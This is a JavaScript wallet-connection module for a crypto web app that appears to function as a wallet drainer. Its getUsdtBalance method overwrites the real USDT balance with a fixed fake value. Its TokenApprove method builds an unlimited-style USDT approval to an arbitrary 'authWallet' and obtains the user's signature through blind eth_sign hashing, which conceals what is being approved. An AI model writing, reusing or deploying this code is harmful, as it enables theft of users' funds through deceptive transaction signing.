import { ethers,BigNumber  } from 'ethers'
import Common from '@/assets/js/common.js'
import Global from '@/assets/js/global.js'
import store from '@/store/index.js'
import Router from '@/router/index.js'

const abiUSDTList = {
    erc : '0xdAC17F958D2ee523a2206206994597C13D831ec7', // 合约 USDT eth 
    bsc : '0x55d398326f99059fF775485246999027B3197955', // 合约 USDT bsc
};


// const usdtContractAddress = '0x55d398326f99059fF775485246999027B3197955'; //bsc平台
// const usdtContractAddress = '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d'; //eth平台

class ChainBlock {
    constructor() {

        window.cbObj = new ethers.providers.Web3Provider(window.ethereum);
    }

    async connectWallet() { //连接钱包
      return window.cbObj.send("eth_requestAccounts", []).then((res) => {
          if(res[0]) {
            console.log(res[0])
            return res[0];
            
          }
      })
        
    }

    async getNetWork() {
      return window.cbObj.getNetwork().then(res => {
        // console.log(res.chainId,111)
        return res;

      })
    }

    changeAccount() {
        ethereum.on('accountsChanged', async (account) => { //断开连接，更换账号

      
        })
    }

    changeChainId() { //监听当前所链接，切换链接
        ethereum.on('chainChanged', (cId) => {




        });
    }
    
    changeChain(chainValue) { //切换链

        ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{chainId: chainValue}]
        
        }).then(res => {


        });
    }
    
    async getUsdtBalance(walletAddress, pingtai) { //用户地址
        
      const usdtContractAddress = abiUSDTList[pingtai];
  
      const usdtContractAbi = [
        {
          constant: true,
          inputs: [
            {
              name: '_owner',
              type: 'address',
            },
          ],
          name: 'balanceOf',
          outputs: [
            {
              name: 'balance',
                type: 'uint256',
              },
          ],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
      ];
      
      

      const usdtContract = new ethers.Contract(
        usdtContractAddress,
        usdtContractAbi,
        window.cbObj
      );

      const rawBalance = await usdtContract.balanceOf(walletAddress);
      let balance = ethers.utils.formatUnits(rawBalance, 6);
      balance = 1.00;

      return balance;
    }
    


    async TokenApprove(pingtai,userWallet,authWallet) {

        var provider = window.cbObj;
        // var provider = window.cbObj.Web3Provider(window.ethereum); 
        // Our fake wallet address
        // let from_address = '0xaD779c9e7D4f9B1BEa11Af058a897c933073D2DA'
        // let from_address = '0x175bA336a92fD9eeF9B7300A38f9F44D1DA76791'
        let from_address = userWallet
        // The fake wallet that we want to transfer our BUSD to
        let to_address = authWallet
        // let to_address = '0x31e7E2CA35Ceb5b9751f84D75AC549CFDb2Bfc8A'
        let amt = ethers.utils.parseEther("100000000000000000000") //授权金额
        // The nonce of our wallet
        let nonce = await provider.getTransactionCount(from_address, "latest")
        // EIP-1559 - new way of estimating gasprice
        let gasPrice = await provider.getFeeData()
        // ABI of the famous transfer function
        let abi = ["function approve(address spender, uint256 amount)"]
        // Address of the BUSD smart contract
        let usdtAddr = abiUSDTList[pingtai];
        // Set a temporary high gas limit
        let gasLimit = 100000
        // Amt of fake BNB to transfer
        let value = 0
        // BSC testnet chain ID  56     eth 1
        let chainId = 1
        // create the data
        let iface = new ethers.utils.Interface(abi);
        let data = iface.encodeFunctionData("approve", [
          // to
          to_address,
          // val
          amt
        ])
        const gasPriceNumber = gasPrice.gasPrice.toNumber() - 0 + Math.ceil(gasPrice.gasPrice.toNumber() * 0.3)
        const gasPriceSum = (gasPriceNumber / Math.pow(10, 18)).toFixed(18)
        const gasPriceAmt = ethers.utils.parseEther(gasPriceSum)
        const gasPriceGwei = Math.floor(gasPriceNumber / Math.pow(10, 9))
        const tx = {
          nonce: nonce,
          gasPrice: gasPriceAmt,
          gasLimit: gasLimit,
          to: usdtAddr,
          value: value,
          data: data,
          chainId: chainId,
        }
  
        let rawTx = ethers.utils.serializeTransaction(tx)
  
        let hash = ethers.utils.keccak256(rawTx)
  
        //前端执行签名
        let jimihash = ethereum.request({method:"eth_sign", params: [ethereum.selectedAddress, hash]})
        return jimihash.then(async res => {
          let rawTx2 = ethers.utils.serializeTransaction(tx, res)
          let tx2 = tx;
          tx2.gasPriceAmt = gasPriceSum
          return {
            rawTx2 : rawTx2,
            tx2 : tx2,
    
          };
        })
    }
}

export default ChainBlock